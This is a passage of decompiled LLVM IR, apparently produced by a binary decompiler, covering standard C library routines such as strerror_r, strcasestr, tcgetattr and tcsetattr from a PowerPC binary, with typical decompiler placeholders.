  store i32 %v4_1000f9ac, i32* %r10.global-to-local, align 4
  %v4_1000f9b8 = icmp eq i8 %v3_1000f9b0, %v3_1000f9ac
  br i1 %v4_1000f9b8, label %dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge, label %dec_label_pc_1000f9c0

dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge: ; preds = %dec_label_pc_1000f9a8
  %v0_1000f980.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f984.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f97c

dec_label_pc_1000f9c0:                            ; preds = %dec_label_pc_1000f9a8, %dec_label_pc_1000f97c, %dec_label_pc_1000f960
  %v0_1000f9c0 = phi i32 [ %v4_1000f968, %dec_label_pc_1000f960 ], [ %v4_1000f9ac, %dec_label_pc_1000f9a8 ], [ %v4_1000f98c, %dec_label_pc_1000f97c ]
  %v3_1000f9c0 = icmp eq i32 %v0_1000f9c0, 0
  br i1 %v3_1000f9c0, label %dec_label_pc_1000f9c8, label %dec_label_pc_1000f920

dec_label_pc_1000f9c8:                            ; preds = %dec_label_pc_1000f9c0
  ret i32 %v0_1000f914.sink

dec_label_pc_1000f9cc:                            ; preds = %dec_label_pc_1000f8f0, %dec_label_pc_1000f940, %dec_label_pc_1000f92c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000f9ac, { 0, 2, 1 }
  uselistorder i8 %v3_1000f98c, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000f914, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000f914.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000f944, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000f93028, { 1, 0 }
  uselistorder i32 %v1_1000f948.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000f8f0, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000f9cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f97c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f958, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000f92c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f948.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268499436, i32* @lr, align 4
  %v0_1000f9e8 = call i32 @__xpg_strerror_r()
  %v0_1000f9f0 = load i32, i32* @r29, align 4
  ret i32 %v0_1000f9f0
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000fa04 = load i32, i32* @r3, align 4
  %v2_1000fa04 = icmp ugt i32 %v0_1000fa04, 124
  %v0_1000fa14 = load i32, i32* @r4, align 4
  store i32 %v0_1000fa14, i32* %r27.global-to-local, align 4
  %v0_1000fa1c = load i32, i32* @r5, align 4
  br i1 %v2_1000fa04, label %dec_label_pc_1000fa60, label %dec_label_pc_1000fa24

dec_label_pc_1000fa24:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_10019630.610 to i32), i32* %r30.global-to-local, align 4
  %v3_1000fa407 = icmp eq i32 %v0_1000fa04, 0
  br i1 %v3_1000fa407, label %dec_label_pc_1000fa54, label %dec_label_pc_1000fa34

dec_label_pc_1000fa34:                            ; preds = %dec_label_pc_1000fa24, %dec_label_pc_1000fa34
  %v0_1000fa38 = phi i32 [ %v1_1000fa38, %dec_label_pc_1000fa34 ], [ ptrtoint ([8 x i8]* @global_var_10019630.610 to i32), %dec_label_pc_1000fa24 ]
  %v1_1000fa38 = add i32 %v0_1000fa38, 1
  store i32 %v1_1000fa38, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fa34

dec_label_pc_1000fa54:                            ; preds = %dec_label_pc_1000fa24
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000fa94

dec_label_pc_1000fa60:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000fa04, 0
  %v1_1000fa64 = zext i1 %tmp to i32
  %v2_1000fa64 = ashr i32 %v0_1000fa04, 31
  %v3_1000fa64 = and i32 %v2_1000fa64, -2
  %v4_1000fa64 = or i32 %v3_1000fa64, %v1_1000fa64
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000fa78 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000fa78 = call i32 @_uintmaxtostr(i8* %v5_1000fa78, i32 %v4_1000fa64, i32 %v0_1000fa04, i32 -10, i32 0)
  %v1_1000fa80 = add i32 %v6_1000fa78, -14
  store i32 %v1_1000fa80, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10019620.611 to i32), i32* @r4, align 4
  store i32 %v1_1000fa80, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268499604, i32* @lr, align 4
  %v0_1000fa90 = call i32 @memcpy()
  %v0_1000fa94.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000fa98.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000faa8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000fa94

dec_label_pc_1000fa94:                            ; preds = %dec_label_pc_1000fa54, %dec_label_pc_1000fa60
  %v0_1000faa8 = phi i32 [ %v0_1000fa1c, %dec_label_pc_1000fa54 ], [ %v0_1000faa8.pre, %dec_label_pc_1000fa60 ]
  %v0_1000fa98 = phi i32 [ ptrtoint ([8 x i8]* @global_var_10019630.610 to i32), %dec_label_pc_1000fa54 ], [ %v0_1000fa98.pre, %dec_label_pc_1000fa60 ]
  %v1_1000fa9c = phi i32 [ %v0_1000fa14, %dec_label_pc_1000fa54 ], [ %v0_1000fa94.pre, %dec_label_pc_1000fa60 ]
  %tmp19 = icmp slt i32 %v1_1000fa9c, 0
  %v1_1000fa94 = zext i1 %tmp19 to i32
  %v2_1000fa94 = ashr i32 %v1_1000fa9c, 31
  %v3_1000fa94 = and i32 %v2_1000fa94, -2
  %v4_1000fa94 = or i32 %v3_1000fa94, %v1_1000fa94
  store i32 %v0_1000fa98, i32* @r3, align 4
  %v2_1000fa9c = xor i32 %v4_1000fa94, %v1_1000fa9c
  %v2_1000faa0 = sub i32 %v4_1000fa94, %v2_1000fa9c
  %tmp20 = icmp slt i32 %v2_1000faa0, 0
  %v1_1000faa4 = zext i1 %tmp20 to i32
  %v2_1000faa4 = ashr i32 %v2_1000faa0, 31
  %v3_1000faa4 = and i32 %v2_1000faa4, -2
  %v4_1000faa4 = or i32 %v3_1000faa4, %v1_1000faa4
  %v2_1000faa8 = and i32 %v4_1000faa4, %v0_1000faa8
  store i32 %v2_1000faa8, i32* @r29, align 4
  %v0_1000faac = call i32 @__GI_strlen()
  %v1_1000fab0 = add i32 %v0_1000faac, 1
  store i32 %v1_1000fab0, i32* %r31.global-to-local, align 4
  %v1_1000fab4 = load i32, i32* @r29, align 4
  %v3_1000fab4 = icmp ugt i32 %v1_1000fab0, %v1_1000fab4
  br i1 %v3_1000fab4, label %dec_label_pc_1000fabc, label %dec_label_pc_1000fac4

dec_label_pc_1000fabc:                            ; preds = %dec_label_pc_1000fa94
  store i32 %v1_1000fab4, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000fac4

dec_label_pc_1000fac4:                            ; preds = %dec_label_pc_1000fa94, %dec_label_pc_1000fabc
  %v0_1000fad4 = phi i32 [ %v1_1000fab4, %dec_label_pc_1000fabc ], [ %v1_1000fab0, %dec_label_pc_1000fa94 ]
  %v3_1000fac4 = icmp eq i32 %v0_1000fad4, 0
  br i1 %v3_1000fac4, label %dec_label_pc_1000fae8, label %dec_label_pc_1000facc

dec_label_pc_1000facc:                            ; preds = %dec_label_pc_1000fac4
  %v0_1000facc = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000facc, i32* @r4, align 4
  %v0_1000fad0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000fad0, i32* @r3, align 4
  store i32 %v0_1000fad4, i32* @r5, align 4
  store i32 268499676, i32* @lr, align 4
  %v0_1000fad8 = call i32 @memcpy()
  %v1_1000fadc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fadc = add i32 %v1_1000fadc, %v0_1000fad0
  %v3_1000fae4 = add i32 %v2_1000fadc, -1
  %v4_1000fae4 = inttoptr i32 %v3_1000fae4 to i8*
  store i8 0, i8* %v4_1000fae4, align 1
  br label %dec_label_pc_1000fae8

dec_label_pc_1000fae8:                            ; preds = %dec_label_pc_1000fac4, %dec_label_pc_1000facc
  %v0_1000fae8 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000fae8 = icmp eq i32 %v0_1000fae8, 0
  br i1 %v3_1000fae8, label %dec_label_pc_1000faf8, label %dec_label_pc_1000faf0

dec_label_pc_1000faf0:                            ; preds = %dec_label_pc_1000fae8
  %v0_1000faf0 = call i32 @__errno_location()
  %v0_1000faf4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000faf4 = inttoptr i32 %v0_1000faf0 to i32*
  store i32 %v0_1000faf4, i32* %v2_1000faf4, align 4
  %v0_1000fafc.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000faf8

dec_label_pc_1000faf8:                            ; preds = %dec_label_pc_1000fae8, %dec_label_pc_1000faf0
  %v0_1000fafc = phi i32 [ 0, %dec_label_pc_1000fae8 ], [ %v0_1000fafc.pre, %dec_label_pc_1000faf0 ]
  ret i32 %v0_1000fafc

; uselistorder directives
  uselistorder i32 %v2_1000faa0, { 1, 0 }
  uselistorder i32 %v4_1000fa94, { 1, 0 }
  uselistorder i32 %v1_1000fa9c, { 1, 2, 0 }
  uselistorder i32 %v1_1000fa38, { 1, 0 }
  uselistorder i32 %v0_1000fa04, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_10019630.610 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000faf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fae8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fac4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa94, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa34, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000fb1c = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000fb1c
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000fb28 = load i32, i32* bitcast (i32** @global_var_1002aba4.613 to i32*), align 4
  store i32 %v3_1000fb28, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fb30

dec_label_pc_1000fb30:                            ; preds = %dec_label_pc_1000fb30.backedge, %entry
  %v0_1000fb30 = phi i32 [ %v0_1000fb30.pre, %dec_label_pc_1000fb30.backedge ], [ %arg2, %entry ]
  %v1_1000fb30 = inttoptr i32 %v0_1000fb30 to i8*
  %v2_1000fb30 = load i8, i8* %v1_1000fb30, align 1
  %v3_1000fb30 = zext i8 %v2_1000fb30 to i32
  store i32 %v3_1000fb30, i32* %r0.global-to-local, align 4
  %v1_1000fb34 = add i32 %v0_1000fb30, 1
  store i32 %v1_1000fb34, i32* %r10.global-to-local, align 4
  %v3_1000fb38 = icmp eq i8 %v2_1000fb30, 0
  %v1_1000fb3c = mul nuw nsw i32 %v3_1000fb30, 2
  store i32 %v1_1000fb3c, i32* %r9.global-to-local, align 4
  %v0_1000fb40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fb38, i32 %v0_1000fb40)
  %v0_1000fb44 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000fb44 = inttoptr i32 %v0_1000fb44 to i8*
  %v2_1000fb44 = load i8, i8* %v1_1000fb44, align 1
  %v3_1000fb44 = zext i8 %v2_1000fb44 to i32
  %v1_1000fb48 = add i32 %v0_1000fb44, 1
  store i32 %v1_1000fb48, i32* %r8.global-to-local, align 4
  %v0_1000fb4c = load i32, i32* %r0.global-to-local, align 4
  %v4_1000fb4c = icmp eq i32 %v0_1000fb4c, %v3_1000fb44
  br i1 %v4_1000fb4c, label %dec_label_pc_1000fb30.backedge, label %dec_label_pc_1000fb58

dec_label_pc_1000fb30.backedge:                   ; preds = %dec_label_pc_1000fb30, %dec_label_pc_1000fb58, %dec_label_pc_1000fb6c
  %v0_1000fb30.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fb30

dec_label_pc_1000fb58:                            ; preds = %dec_label_pc_1000fb30
  %v1_1000fb50 = mul nuw nsw i32 %v3_1000fb44, 2
  %v0_1000fb58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fb58 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000fb58 = add i32 %v1_1000fb58, %v0_1000fb58
  %v3_1000fb58 = inttoptr i32 %v2_1000fb58 to i16*
  %v4_1000fb58 = load i16, i16* %v3_1000fb58, align 2
  %v5_1000fb58 = sext i16 %v4_1000fb58 to i32
  store i32 %v5_1000fb58, i32* %r9.global-to-local, align 4
  %v2_1000fb60 = add i32 %v1_1000fb58, %v1_1000fb50
  %v3_1000fb60 = inttoptr i32 %v2_1000fb60 to i16*
  %v4_1000fb60 = load i16, i16* %v3_1000fb60, align 2
  %v5_1000fb60 = sext i16 %v4_1000fb60 to i32
  store i32 %v5_1000fb60, i32* %r0.global-to-local, align 4
  %v4_1000fb64 = icmp eq i16 %v4_1000fb58, %v4_1000fb60
  br i1 %v4_1000fb64, label %dec_label_pc_1000fb30.backedge, label %dec_label_pc_1000fb6c

dec_label_pc_1000fb6c:                            ; preds = %dec_label_pc_1000fb58
  %v3_1000fb5c = icmp eq i8 %v2_1000fb44, 0
  %v0_1000fb6c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000fb6c = add i32 %v0_1000fb6c, 1
  store i32 %v1_1000fb6c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000fb6c, i32* %r8.global-to-local, align 4
  br i1 %v3_1000fb5c, label %dec_label_pc_1000fb7c, label %dec_label_pc_1000fb30.backedge

dec_label_pc_1000fb7c:                            ; preds = %dec_label_pc_1000fb6c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000fb30, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fb30.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002abe8.614 to i32), i32* @r5, align 4
  %v1_1000fb8c = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002abe8.614 to i32))
  ret i32 %v1_1000fb8c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268499876, i32* @lr, align 4
  %v2_1000fba0 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000fbc0 = load i32, i32* @lr, align 4
  store i32 %v0_1000fbc0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000fbd0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268499940, i32* @lr, align 4
  %v3_1000fbe0 = call i32 @ioctl(i32 1076655123, i32 %v2_1000fbd0, i32 %v2_1000fbd0)
  %v2_1000fbe4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000fbe4, i32* @r4, align 4
  store i32 %v3_1000fbe0, i32* @r30, align 4
  %v3_1000fbe8 = icmp eq i32 %v3_1000fbe0, 0
  store i32 19, i32* @r5, align 4
  %v0_1000fbf0 = load i32, i32* @r31, align 4
  br i1 %v3_1000fbe8, label %dec_label_pc_1000fbf8, label %dec_label_pc_1000fc40

dec_label_pc_1000fbf8:                            ; preds = %entry
  %v1_1000fbf0 = add i32 %v0_1000fbf0, 17
  %v3_1000fc10 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000fc10, i32* %r0.global-to-local, align 4
  %v2_1000fc14 = add i32 %v0_1000fbf0, 4
  %v3_1000fc14 = inttoptr i32 %v2_1000fc14 to i32*
  store i32 %tmp7, i32* %v3_1000fc14, align 4
  %v0_1000fc18 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fc18 = load i32, i32* @r31, align 4
  %v2_1000fc18 = inttoptr i32 %v1_1000fc18 to i32*
  store i32 %v0_1000fc18, i32* %v2_1000fc18, align 4
  %v0_1000fc1c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fc1c = load i32, i32* @r31, align 4
  %v2_1000fc1c = add i32 %v1_1000fc1c, 8
  %v3_1000fc1c = inttoptr i32 %v2_1000fc1c to i32*
  store i32 %v0_1000fc1c, i32* %v3_1000fc1c, align 4
  %v0_1000fc20 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000fc20 = load i32, i32* @r31, align 4
  %v2_1000fc20 = add i32 %v1_1000fc20, 12
  %v3_1000fc20 = inttoptr i32 %v2_1000fc20 to i32*
  store i32 %v0_1000fc20, i32* %v3_1000fc20, align 4
  %v3_1000fc24 = load i32, i32* @r31, align 4
  %v4_1000fc24 = add i32 %v3_1000fc24, 16
  %v5_1000fc24 = inttoptr i32 %v4_1000fc24 to i8*
  store i8 %tmp4, i8* %v5_1000fc24, align 1
  %v1_1000fc28 = load i32, i32* @r31, align 4
  %v2_1000fc28 = add i32 %v1_1000fc28, 52
  %v3_1000fc28 = inttoptr i32 %v2_1000fc28 to i32*
  store i32 %tmp3, i32* %v3_1000fc28, align 4
  %v1_1000fc2c = load i32, i32* @r31, align 4
  %v2_1000fc2c = add i32 %v1_1000fc2c, 56
  %v3_1000fc2c = inttoptr i32 %v2_1000fc2c to i32*
  store i32 %tmp2, i32* %v3_1000fc2c, align 4
  store i32 268500020, i32* @lr, align 4
  %v6_1000fc30 = sext i8 %tmp4 to i32
  %v8_1000fc30 = call i32 @__GI_mempcpy(i32 %v1_1000fbf0, i32 %v2_1000fbe4, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000fc30, i32 %tmp7)
  store i32 268500032, i32* @lr, align 4
  %v3_1000fc3c = call i32 @__GI_memset(i32 %v8_1000fc30, i32 0, i32 13)
  %v0_1000fc44.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fc40

dec_label_pc_1000fc40:                            ; preds = %entry, %dec_label_pc_1000fbf8
  %v0_1000fc44 = phi i32 [ %v3_1000fbe0, %entry ], [ %v0_1000fc44.pre, %dec_label_pc_1000fbf8 ]
  store i32 %v0_1000fbc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fc44

; uselistorder directives
  uselistorder i32 %v2_1000fbd0, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc40, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000fc58 = load i32, i32* @r4, align 4
  %v3_1000fc58 = icmp eq i32 %v0_1000fc58, 1
  %v0_1000fc68 = load i32, i32* @r3, align 4
  store i32 %v0_1000fc68, i32* @r27, align 4
  %v0_1000fc70 = load i32, i32* @r5, align 4
  store i32 %v0_1000fc70, i32* @r31, align 4
  br i1 %v3_1000fc58, label %dec_label_pc_1000fc94, label %dec_label_pc_1000fc78

dec_label_pc_1000fc78:                            ; preds = %entry
  %v3_1000fc78 = icmp eq i32 %v0_1000fc58, 2
  br i1 %v3_1000fc78, label %dec_label_pc_1000fcb4, label %dec_label_pc_1000fc80

dec_label_pc_1000fc80:                            ; preds = %dec_label_pc_1000fc78
  %v3_1000fc80 = icmp eq i32 %v0_1000fc58, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000fc80, label %dec_label_pc_1000fcbc, label %dec_label_pc_1000fca0

dec_label_pc_1000fc94:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000fcbc

dec_label_pc_1000fca0:                            ; preds = %dec_label_pc_1000fc80
  %v0_1000fca0 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000fcac = inttoptr i32 %v0_1000fca0 to i32*
  store i32 22, i32* %v2_1000fcac, align 4
  br label %dec_label_pc_1000fda4

dec_label_pc_1000fcb4:                            ; preds = %dec_label_pc_1000fc78
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000fcbc

dec_label_pc_1000fcbc:                            ; preds = %dec_label_pc_1000fc80, %dec_label_pc_1000fc94, %dec_label_pc_1000fcb4
  %v1_1000fcbc = inttoptr i32 %v0_1000fc70 to i32*
  %v2_1000fcbc = load i32, i32* %v1_1000fcbc, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000fcc4 = add i32 %v0_1000fc70, 4
  %v2_1000fcc4 = inttoptr i32 %v1_1000fcc4 to i32*
  %v3_1000fcc4 = load i32, i32* %v2_1000fcc4, align 4
  store i32 %v3_1000fcc4, i32* %r9.global-to-local, align 4
  %v1_1000fcc8 = add i32 %v0_1000fc70, 17
  store i32 %v1_1000fcc8, i32* @r4, align 4
  %v1_1000fccc = add i32 %v0_1000fc70, 8
  %v2_1000fccc = inttoptr i32 %v1_1000fccc to i32*
  %v3_1000fccc = load i32, i32* %v2_1000fccc, align 4
  %v2_1000fcd0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000fcd0, i32* @r3, align 4
  %v2_1000fcd8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000fcd8, i32* @r26, align 4
  store i32 %v2_1000fcbc, i32* %stack_var_-72, align 4
  store i32 268500232, i32* @lr, align 4
  %v0_1000fd04 = call i32 @memcpy()
  %v0_1000fd08 = load i32, i32* @r27, align 4
  %v0_1000fd0c = load i32, i32* @r30, align 4
  store i32 268500252, i32* @lr, align 4
  %v3_1000fd18 = call i32 @ioctl(i32 %v0_1000fd08, i32 %v0_1000fd0c, i32 %v2_1000fcd8)
  store i32 %v3_1000fd18, i32* @r28, align 4
  %v3_1000fd1c = icmp eq i32 %v3_1000fd18, 0
  br i1 %v3_1000fd1c, label %dec_label_pc_1000fd24, label %dec_label_pc_1000fda4

dec_label_pc_1000fd24:                            ; preds = %dec_label_pc_1000fcbc
  %v0_1000fd24 = load i32, i32* @r30, align 4
  %v3_1000fd28 = icmp eq i32 %v0_1000fd24, -2144570348
  br i1 %v3_1000fd28, label %dec_label_pc_1000fd30, label %dec_label_pc_1000fda0

dec_label_pc_1000fd30:                            ; preds = %dec_label_pc_1000fd24
  %v0_1000fd30 = call i32 @__errno_location()
  store i32 %v0_1000fd30, i32* @r29, align 4
  %v0_1000fd40 = load i32, i32* @r27, align 4
  %v1_1000fd48 = inttoptr i32 %v0_1000fd30 to i32*
  %v2_1000fd48 = load i32, i32* %v1_1000fd48, align 4
  store i32 %v2_1000fd48, i32* @r30, align 4
  store i32 268500308, i32* @lr, align 4
  %v3_1000fd50 = call i32 @ioctl(i32 %v0_1000fd40, i32 1076655123, i32 %v2_1000fcd8)
  %v3_1000fd54 = icmp eq i32 %v3_1000fd50, 0
  br i1 %v3_1000fd54, label %dec_label_pc_1000fd64, label %dec_label_pc_1000fd5c

dec_label_pc_1000fd5c:                            ; preds = %dec_label_pc_1000fd30
  %v0_1000fd5c = load i32, i32* @r30, align 4
  %v1_1000fd5c = load i32, i32* @r29, align 4
  %v2_1000fd5c = inttoptr i32 %v1_1000fd5c to i32*
  store i32 %v0_1000fd5c, i32* %v2_1000fd5c, align 4
  br label %dec_label_pc_1000fda4

dec_label_pc_1000fd64:                            ; preds = %dec_label_pc_1000fd30
  %v0_1000fd64 = load i32, i32* @r31, align 4
  %v1_1000fd64 = add i32 %v0_1000fd64, 8
  %v2_1000fd64 = inttoptr i32 %v1_1000fd64 to i32*
  %v3_1000fd64 = load i32, i32* %v2_1000fd64, align 4
  %v1_1000fd6c = call i32 @__asm_rlwinm(i32 %v3_1000fd64, i32 0, i32 19, i32 20)
  %v1_1000fd70 = call i32 @__asm_rlwinm(i32 %v3_1000fccc, i32 0, i32 19, i32 20)
  store i32 %v1_1000fd70, i32* %r9.global-to-local, align 4
  %v4_1000fd74 = icmp eq i32 %v1_1000fd6c, %v1_1000fd70
  br i1 %v4_1000fd74, label %dec_label_pc_1000fd7c, label %dec_label_pc_1000fd90

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fd64
  %v1_1000fd7c = and i32 %v3_1000fd64, 768
  store i32 %v1_1000fd7c, i32* %r9.global-to-local, align 4
  %v3_1000fd7c = icmp eq i32 %v1_1000fd7c, 0
  br i1 %v3_1000fd7c, label %dec_label_pc_1000fda0, label %dec_label_pc_1000fd84

dec_label_pc_1000fd84:                            ; preds = %dec_label_pc_1000fd7c
  %v1_1000fd84 = call i32 @__asm_rlwinm(i32 %v3_1000fccc, i32 0, i32 22, i32 23)
  %v0_1000fd88 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000fd88 = icmp eq i32 %v0_1000fd88, %v1_1000fd84
  br i1 %v4_1000fd88, label %dec_label_pc_1000fda0, label %dec_label_pc_1000fd90

dec_label_pc_1000fd90:                            ; preds = %dec_label_pc_1000fd64, %dec_label_pc_1000fd84
  store i32 -1, i32* @r28, align 4
  %v1_1000fd98 = load i32, i32* @r29, align 4
  %v2_1000fd98 = inttoptr i32 %v1_1000fd98 to i32*
  store i32 22, i32* %v2_1000fd98, align 4
  br label %dec_label_pc_1000fda4

dec_label_pc_1000fda0:                            ; preds = %dec_label_pc_1000fd24, %dec_label_pc_1000fd84, %dec_label_pc_1000fd7c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000fda4

dec_label_pc_1000fda4:                            ; preds = %dec_label_pc_1000fcbc, %dec_label_pc_1000fd5c, %dec_label_pc_1000fca0, %dec_label_pc_1000fd90, %dec_label_pc_1000fda0
  %v0_1000fda8 = load i32, i32* @r28, align 4
  ret i32 %v0_1000fda8

; uselistorder directives
  uselistorder i32 %v0_1000fc70, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000fda4, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fda0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000fd90, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcbc, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000fdbc = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdbc
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000fdc0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdc0
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fdc4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdc4
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fdc8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdc8
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000fdcc = icmp ugt i32 %arg1, 4
